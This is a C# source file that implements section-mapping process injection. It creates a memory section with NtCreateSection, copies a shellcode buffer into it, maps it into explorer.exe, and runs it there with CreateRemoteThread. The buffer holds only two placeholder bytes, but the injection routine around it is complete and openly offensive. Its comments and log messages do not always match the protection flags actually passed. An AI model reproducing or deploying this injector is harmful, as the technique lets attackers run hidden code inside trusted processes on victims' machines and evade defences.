using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{

    public class TestClass
    {
        // OpenProcess - kernel32.dll 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // CreateRemoteThread - kernel32.dll 
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // GetCurrentProcess - kernel32.dll 
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        private static extern uint NtCreateSection(
            ref IntPtr section,
            uint desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        private static extern int NtClose(IntPtr hObject);

        private static void Main(string[] args)
        {
            var buf = new byte[2]
            {
                0xfc,0x48
            };

            // get size of the buffer
            long buffer_size = buf.Length;

            // create a empty section handle
            var ptr_section_handle = IntPtr.Zero;

            // create a section of size buffer_size
            var create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40,
                0x08000000, IntPtr.Zero);

            // error checking
            if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while creating the section.");
                Environment.Exit(1);
            }

            Console.WriteLine("[+] The section has been created successfully.");
            Console.WriteLine("[*] ptr_section_handle: 0x" + string.Format("{0:X}", ptr_section_handle.ToInt64()));

            // create our section offset pointer and section address
            long local_section_offset = 0;
            var ptr_local_section_addr = IntPtr.Zero;

            // map the view of the section into the current process with READWRITE access 
            var local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(),
                ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0,
                0x04);

            if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while mapping the view within the local section.");
                Environment.Exit(1);
            }

            Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
            Console.WriteLine("[*] ptr_local_section_addr: 0x" +
                              string.Format("{0:X}", ptr_local_section_addr.ToInt64()));

            // Copy the buffer into the local section address
            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

            // get the explorer process
            var process = Process.GetProcessesByName("explorer")[0];

            // Open a handle to explorer
            var hProcess = OpenProcess(0x001F0FFF, false, process.Id);

            // create pointer to remote section address
            var ptr_remote_section_addr = IntPtr.Zero;

            // map the view of the section into the remote process with EXECUTE_READ access
            var remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr,
                IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

            if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
                Environment.Exit(1);
            }

            Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
            Console.WriteLine("[*] ptr_remote_section_addr: 0x" +
                              string.Format("{0:X}", ptr_remote_section_addr.ToInt64()));

            // now unmap the view of the section in the local process
            // we pass in the pointer to the local section address and the open section handle
            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            // create a remote thread in the explorer process
            // we pass in the handle to the explorer process and a pointer to the remote section address
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}